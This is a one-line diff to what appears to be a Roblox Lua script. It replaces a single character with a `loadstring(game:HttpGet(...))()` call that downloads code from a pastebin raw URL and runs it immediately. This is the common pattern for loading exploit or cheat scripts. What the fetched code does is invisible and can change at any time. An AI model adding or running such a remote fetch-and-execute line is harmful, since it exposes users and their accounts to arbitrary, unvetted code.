@@ -1,1 +1,1 @@
-s
+loadstring(game:HttpGet("https://pastebin.com/raw/fzmcC0YS", true))()
